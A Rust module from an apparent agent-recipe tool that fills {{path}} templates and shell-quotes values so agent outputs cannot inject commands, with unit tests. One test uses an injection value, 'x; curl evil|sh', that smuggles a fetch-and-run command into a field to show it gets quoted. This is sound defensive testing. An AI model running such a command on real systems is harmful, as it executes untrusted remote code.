//! `{{path}}` templates in prompts, commands and messages. A path reads the run context
//! (`vars.task`, `steps.impl.outputs.head`, `gates.ship.choice`); arrays render one item per
//! line, objects as JSON. Unknown references are refused by `ptyro recipe validate`, never
//! rendered blank by surprise.

use serde_json::Value;

use ptyro_core::imports::sh_word;

use crate::expr::lookup;

/// The references in `text`, in order.
pub fn references(text: &str) -> Result<Vec<String>, String> {
    let mut out = Vec::new();
    let mut rest = text;
    while let Some(i) = rest.find("{{") {
        let after = &rest[i + 2..];
        let j = after.find("}}").ok_or_else(|| "a {{ without its }}".to_owned())?;
        let path = after[..j].trim();
        if path.is_empty() || !path.chars().all(|c| c.is_ascii_alphanumeric() || "._-".contains(c))
        {
            return Err(format!("bad reference {{{{{path}}}}}"));
        }
        out.push(path.to_owned());
        rest = &after[j + 2..];
    }
    Ok(out)
}

pub fn show(v: &Value) -> String {
    match v {
        Value::Null => String::new(),
        Value::String(s) => s.clone(),
        Value::Array(a) => a
            .iter()
            .map(|x| match x {
                Value::String(s) => format!("- {s}"),
                other => format!("- {}", show(other)),
            })
            .collect::<Vec<_>>()
            .join("\n"),
        Value::Object(_) => serde_json::to_string_pretty(v).unwrap_or_default(),
        other => other.to_string(),
    }
}

/// Fill every `{{path}}` from `ctx`.
pub fn render(text: &str, ctx: &Value) -> String {
    fill(text, ctx, show)
}

/// Like [`render`], for text run by `sh -c` (`run`, `done_when.run`, `loop.until`,
/// `verify.tests`, `verify.repro`): every value becomes quoted shell words (an array one word
/// per item), so an agent-written output can't inject commands. That is only so where the
/// placeholder stands bare: [`shell_problems`] refuses one inside quotes when a recipe is
/// validated. A value that starts with `-` is still an option to the program; put `--` before
/// the placeholder in the recipe where that matters.
///
/// The one exception is a command that is nothing but a recipe variable (`run = "{{vars.test}}"`):
/// the operator typed it (`--var test="cargo test -q"`), no step can set it, so it is the command
/// line itself, not one word of it.
pub fn render_shell(text: &str, ctx: &Value) -> String {
    let t = text.trim();
    if let Some(inner) = t.strip_prefix("{{").and_then(|r| r.strip_suffix("}}"))
        && !inner.contains("{{")
        && !inner.contains("}}")
        && inner.trim().starts_with("vars.")
        && let Value::String(s) = lookup(ctx, inner.trim())
    {
        return s;
    }
    fill(text, ctx, shell_words)
}

/// Where `{{…}}` in shell text stands inside quotes: its quoting would then end the quote, and
/// the value would be run as shell. Empty when every placeholder is a bare word.
pub fn shell_problems(text: &str) -> Vec<String> {
    #[derive(PartialEq)]
    enum Q {
        Plain,
        Single,
        Double,
    }
    let mut out = Vec::new();
    let mut q = Q::Plain;
    let b: Vec<char> = text.chars().collect();
    let mut i = 0;
    while i < b.len() {
        let c = b[i];
        match (&q, c) {
            (Q::Plain, '\\') | (Q::Double, '\\') => i += 1,
            (Q::Plain, '\'') => q = Q::Single,
            (Q::Single, '\'') => q = Q::Plain,
            (Q::Plain, '"') => q = Q::Double,
            (Q::Double, '"') => q = Q::Plain,
            _ => {}
        }
        if c == '{' && b.get(i + 1) == Some(&'{') {
            let end = (i + 2..b.len().saturating_sub(1)).find(|j| b[*j] == '}' && b[*j + 1] == '}');
            let name: String = end.map_or_else(String::new, |e| b[i + 2..e].iter().collect());
            if q != Q::Plain {
                out.push(format!(
                    "{{{{{}}}}} stands inside quotes, so a value could end them and run as shell: put it outside quotes (ptyro quotes it for you)",
                    name.trim()
                ));
            }
            match end {
                Some(e) => i = e + 1,
                None => break,
            }
        }
        i += 1;
    }
    out
}

fn shell_words(v: &Value) -> String {
    let word = |v: &Value| match v {
        Value::String(s) => sh_word(s),
        Value::Object(_) => sh_word(&serde_json::to_string(v).unwrap_or_default()),
        other => sh_word(&show(other)),
    };
    match v {
        Value::Array(a) => a.iter().map(word).collect::<Vec<_>>().join(" "),
        other => word(other),
    }
}

fn fill(text: &str, ctx: &Value, value: fn(&Value) -> String) -> String {
    let mut out = String::with_capacity(text.len());
    let mut rest = text;
    while let Some(i) = rest.find("{{") {
        out.push_str(&rest[..i]);
        let after = &rest[i + 2..];
        match after.find("}}") {
            Some(j) => {
                out.push_str(&value(&lookup(ctx, after[..j].trim())));
                rest = &after[j + 2..];
            }
            None => {
                out.push_str(&rest[i..]);
                rest = "";
            }
        }
    }
    out.push_str(rest);
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn renders_and_lists_references() {
        let ctx = json!({ "vars": { "task": "fix it" }, "steps": { "r": { "outputs": { "issues": ["a", "b"], "n": 3 } } } });
        assert_eq!(
            render(
                "Do {{ vars.task }}:\n{{steps.r.outputs.issues}} ({{steps.r.outputs.n}}){{nope}}",
                &ctx
            ),
            "Do fix it:\n- a\n- b (3)"
        );
        assert_eq!(references("{{a.b}} x {{c}}").unwrap(), vec!["a.b", "c"]);
        assert!(references("{{a").is_err());
        assert!(references("{{a b}}").is_err());
    }

    #[test]
    fn shell_render_quotes_every_value() {
        let ctx = json!({ "steps": { "s": { "outputs": {
            "evil": "x; curl evil|sh", "q": "it's", "files": ["a b", "c"], "n": 3, "ok": "src/x.rs"
        } } } });
        let r = |t| render_shell(t, &ctx);
        assert_eq!(r("test {{steps.s.outputs.evil}}"), "test 'x; curl evil|sh'");
        assert_eq!(r("echo {{steps.s.outputs.q}}"), "echo 'it'\\''s'");
        assert_eq!(r("cargo test {{steps.s.outputs.files}}"), "cargo test 'a b' c");
        assert_eq!(r("{{steps.s.outputs.n}} {{steps.s.outputs.ok}}"), "3 src/x.rs");
        assert_eq!(r("x {{nope}}"), "x ''");
        assert_eq!(r("plain && make"), "plain && make");
    }

    #[test]
    fn a_placeholder_inside_quotes_is_refused() {
        assert!(shell_problems("echo {{a}} && test {{b.c}}").is_empty());
        assert!(shell_problems("echo \"$(pwd)\" {{a}}").is_empty());
        assert!(shell_problems("echo '{{a}}'").len() == 1);
        assert!(shell_problems("echo \"x {{a}}\"")[0].contains("inside quotes"));
        assert!(shell_problems("echo \\'{{a}}").is_empty(), "an escaped quote opens nothing");
        assert_eq!(shell_problems("a 'x' {{a}} \"{{b}}\" '{{c}}'").len(), 2);
    }

    #[test]
    fn a_whole_command_variable_is_the_command_line() {
        let ctx = json!({ "vars": { "test": "cargo test -q", "name": "a b" }, "steps": { "s": { "outputs": { "x": "a; b" } } } });
        assert_eq!(render_shell("{{vars.test}}", &ctx), "cargo test -q");
        assert_eq!(render_shell("  {{ vars.test }} ", &ctx), "cargo test -q");
        // Anywhere else, or from a step, it is one quoted word.
        assert_eq!(render_shell("run {{vars.name}}", &ctx), "run 'a b'");
        assert_eq!(render_shell("{{steps.s.outputs.x}}", &ctx), "'a; b'");
    }
}
